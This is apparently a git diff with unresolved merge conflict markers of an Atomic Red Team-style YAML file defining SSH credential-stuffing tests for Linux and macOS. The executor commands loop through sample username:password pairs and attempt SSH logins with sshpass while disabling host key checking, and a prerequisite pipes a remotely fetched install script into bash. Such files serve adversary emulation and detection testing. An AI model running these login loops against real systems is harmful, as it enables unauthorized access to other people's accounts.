@@ -4,8 +4,14 @@ display_name: 'Brute Force: Credential Stuffing'
 
 atomic_tests:
 - name: SSH Credential Stuffing From Linux
+<<<<<<< HEAD
   description: |
     Using username,password combination from a password dump to login over SSH
+=======
+  auto_generated_guid: 4f08197a-2a8a-472d-9589-cd2895ef22ad
+  description: |
+    Using username,password combination from a password dump to login over SSH.
+>>>>>>> 776224b7d3467ca42dedf44d8ea2fb4b924eaea8
 
   supported_platforms:
     - linux
@@ -16,6 +22,7 @@ atomic_tests:
       type: String
       default: localhost
 
+<<<<<<< HEAD
   dependency_executor_name: SSHPASS # (optional) The executor for the prereq commands, defaults to the same executor used by the attack commands.
   dependencies: # (optional)
     - description: |
@@ -24,11 +31,22 @@ atomic_tests:
         if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
       get_prereq_command: | # Commands to meet this prerequisite or a message describing how to meet this prerequisite.
         if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then sudo yum update -y && sudo yum install sshpass -y ; else echo "This test requires sshpass" ; fi ;
+=======
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Requires SSHPASS
+      prereq_command: |
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
+      get_prereq_command: |
+        if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo "This test requires sshpass" ; fi ;
+>>>>>>> 776224b7d3467ca42dedf44d8ea2fb4b924eaea8
 
   executor:
     name: bash
     elevation_required: false
     command: |
+<<<<<<< HEAD
       cat > /tmp/usernamepass.txt << EOF
       john.doe:jonathan123!
       jane.doe:spongebob402
@@ -46,6 +64,15 @@ atomic_tests:
 - name: SSH Credential Stuffing From MacOS
   description: |
     Using username,password combination from a password dump to login over SSH
+=======
+      cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+      for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+
+- name: SSH Credential Stuffing From MacOS
+  auto_generated_guid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
+  description: |
+    Using username,password combination from a password dump to login over SSH.
+>>>>>>> 776224b7d3467ca42dedf44d8ea2fb4b924eaea8
 
   supported_platforms:
     - macos
@@ -56,6 +83,7 @@ atomic_tests:
       type: String
       default: localhost
 
+<<<<<<< HEAD
   dependency_executor_name: SSHPASS # (optional) The executor for the prereq commands, defaults to the same executor used by the attack commands.
   dependencies: # (optional)
     - description: |
@@ -63,6 +91,15 @@ atomic_tests:
       prereq_command: | # Commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the prerequisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
         if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
       get_prereq_command: | # Commands to meet this prerequisite or a message describing how to meet this prerequisite.
+=======
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Requires SSHPASS
+      prereq_command: |
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
+      get_prereq_command: |
+>>>>>>> 776224b7d3467ca42dedf44d8ea2fb4b924eaea8
         /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
         brew install hudochenkov/sshpass/sshpass
 
@@ -70,6 +107,7 @@ atomic_tests:
     name: bash
     elevation_required: false
     command: |
+<<<<<<< HEAD
       cat > /tmp/usernamepass.txt << EOF
       john.doe:jonathan123!
       jane.doe:spongebob402
@@ -82,4 +120,8 @@ atomic_tests:
       EOF
 
       for unamepass in $(cat /tmp/usernamepass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+=======
+      cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+      for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+>>>>>>> 776224b7d3467ca42dedf44d8ea2fb4b924eaea8
 
